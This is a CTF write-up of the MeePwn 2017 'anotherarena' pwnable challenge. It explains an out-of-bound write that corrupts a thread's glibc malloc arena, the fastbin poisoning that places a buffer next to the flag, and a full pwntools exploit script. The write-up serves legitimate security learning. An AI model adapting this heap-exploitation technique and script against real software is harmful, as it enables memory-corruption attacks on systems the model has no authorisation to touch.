---
title: MeePwn CTF 2017 -- anotherarena
layout: single
comments: true
share: true
related: true
author_profile: true
permalink: "/:title/"
tags:
- CTF
- Pwnable
- Python
- MeePwn
- heap
categories:
- write-ups
date: '2017-07-16 11:00:00 +0000'
---

**Category:** Pwnable

64 bit ELF, Partial RELRO, canary & NX enabled, No PIE.  

<!-- more -->


The program is a simple crackme program with multi-thread. First, the program will read the FLAG into a global buffer `flag` . Then, it will ask us to input the size of a buffer. Later the program will use a thread to malloc a buffer `buf` with the given size. Then the program will use another thread to do the following:  
* Ask for a 4 byte data and treat it as `index`
* Ask for a 4 byte data, and store it at `buf[index]`
* Repeat


It will repeat `given_size / 4` times. If the input `index` is larger than the given size, it will also break out the loop. Basically it just letting us input a bunch of integers to the `buf` buffer.  


After that the program will do the following:
```c
/* add all integers in buf to v5*/
for ( i = 0; i < LODWORD(g_size[0]); i += 4 )
    v5 += *(int *)((char *)g_heap_buf + (signed int)i);

/* read size and allocate a buffer ( for license) */
size = read_int();
lic = malloc((unsigned int)size);
/* read to lic */
read(0, lic, (unsigned int)size);
/* crackme check*/
if ( v5 == 3233853430 )
    printf("Good boy! Your license: %s\n", lic);
else
    puts("Bad b0y!");
exit(0);
```

So, to solve this challenge, we'll have to:
* Pass the crackme check ( this is easy )
* **Locate the `lic` buffer at ( or near ) the `flag` buffer**, so later we can leak the flag by print out the license content. We'll focus on this one.


First of all the program has a out-of-bound write vulnerability: by input a **negative** `index`, we can overwrite the data at `buf[-XXX]`.  

Before we use this vulnerability to exploit the service, we'll have to understand how the malloc work in different thread. When a thread wants to malloc a buffer, it will use its own `arena` structure, a data structure which stores the malloc state of that thread ( check out the [source code](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#1648) ). The `arena` structure will also store the fastbin chunks' address ( the `fastbinsY[NFASTBINS]` member ). 

If we can control `fastbinsY[NFASTBINS]`, we'll be able to malloc a fastbin chunk at any address ( theoretically, since we'll still need to bypass some check in malloc ). By using gdb, we can locate the thread `arena`'s address is at `buf - 0x8a0`, making us able to use the OOB write to overwrite its data structure.

Now we'll have to choose our fake chunk's location. I decided to choose the address `0x6020bd`: 

```
gdb-peda$ x/2gx 0x6020bd
0x6020bd:       0xfff7bb5540000000      0x000000000000007f   <-- fake fastbin chunk ( size = 0x70 )
```

We can see that `0x6020bd` is a good target of a fake fastbin[5] chunk ( size = 0x70 ). The `0x7f` is a part of the `stderr` address. Moreover, the `flag` is at `0x602101` ( behind the fake chunk ) , so we can just pad some chars to the allocated chunk ( pad until it reach the beginning of the flag buffer ), later when the program print out the license content, it will give us the flag as well.  

So to sum up:
1. Use the OOB write to overwrite `fastbinsY[5]`
2. Choose the fake fastbin[5] chunk target at `0x6020bd`
3. Input the data to bypass the crackme check
4. Input allocate size to make `malloc()` allocate fastbin[5] ( size = 0x70 )
5. Pad the allocated buffer until it reach the `flag` buffer
6. Print out the license and get the flag

```python
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "139.59.241.76"
PORT = 31335
ELF_PATH = "./anotherarena_noalarm"

context.binary = ELF_PATH
context.log_level = 'INFO' # ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.terminal = ['tmux', 'splitw'] # for gdb.attach

elf = context.binary # context.binary is an ELF object

flag = 0x602101
fake_chunk = 0x6020bd

def write(off, data):
    r.send(p32(off))
    time.sleep(0.5)
    r.send(p32(data))
    time.sleep(0.5)

if __name__ == "__main__":
    
    r = remote(HOST, PORT)

    r.sendline("50")
    time.sleep(0.5)
    # move the offset to thread's arena + 0x30 ( fastbin[5], size=0x70 )
    # fake chunk near stderr, use its 0x7f to create fake chunk
    write(0xfffff790, fake_chunk)
    # make final answer = 3233853430
    write(0, 0x7fffffff)
    write(4, 0x40c0af8f)
    
    # break loop
    r.send(p32(100)) 
    time.sleep(0.5)
    
    # allocate buf & pad to flag
    r.sendline("104") # allocate 104 byte
    time.sleep(0.5)
    r.send("i"*0x34) # pad to flag

    r.interactive()
```

flag: `MeePwnCTF{oveRwrit3_another_(main)_arena}`